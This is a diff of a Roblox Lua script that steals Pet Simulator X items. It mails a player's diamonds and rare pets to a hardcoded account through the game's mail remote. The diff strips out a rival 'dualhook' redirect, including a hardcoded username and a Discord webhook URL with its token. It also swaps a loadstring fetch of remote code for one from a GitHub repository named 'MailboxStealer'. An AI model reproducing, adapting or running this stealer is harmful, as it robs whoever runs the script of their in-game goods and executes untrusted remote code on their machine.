@@ -16,8 +16,6 @@ for i,v in pairs(Library.Save.Get().Pets) do
     end
 end
 if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
-     UserName = "TehPucuk_55"
-     Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
 end
 
 if getgenv().executed then return end
@@ -770,7 +768,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Monz", true))()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))()
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1256,7 +1254,6 @@ if FinalList == 0 then
     end
     if gemsin ~= nil then
         if dualhook(gemsin) then
-            user = dhuser
         end
     end
     local args = {
@@ -1276,7 +1273,6 @@ spawn(function()
                 user = UserName
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1288,7 +1284,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1304,7 +1300,6 @@ spawn(function()
                 user = UserName
                 if bananin ~= nil then
                     if dualhook(bananin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1316,7 +1311,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #BList == 0 or BList == {} then
                     -- print("done2")
                     break
@@ -1334,7 +1329,6 @@ spawn(function()
                 user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1346,7 +1340,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #HList == 0 or HList == {} then
                     -- print("done3")
                     break
@@ -1363,7 +1357,6 @@ spawn(function()
                 user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1375,7 +1368,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #PList == 0 or PList == {} then
                     -- print("done1")
                     break
@@ -1391,7 +1384,6 @@ spawn(function()
                 user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1403,7 +1395,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #EList == 0 or EList == {} then
                     -- print("done42")
                     break
@@ -1419,7 +1411,6 @@ spawn(function()
                 user = ndUser
                 if eventin ~= nil then
                     if dualhook(eventin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1431,7 +1422,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
@@ -1447,7 +1438,6 @@ spawn(function()
                 user = ndUser
                 if secretin ~= nil then
                     if dualhook(secretin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1459,7 +1449,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #SList == 0 or SList == {} then
                     -- print("done6")
                     break
@@ -1475,7 +1465,6 @@ spawn(function()
                 user = ndUser
                 if mythicin ~= nil then
                     if dualhook(mythicin) then
-                        user = dhuser
                     end
                 end
                 local args = {
@@ -1487,7 +1476,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 -- print("secret sending")
                 if #MList == 0 or MList == {} then
                     -- print("done6")
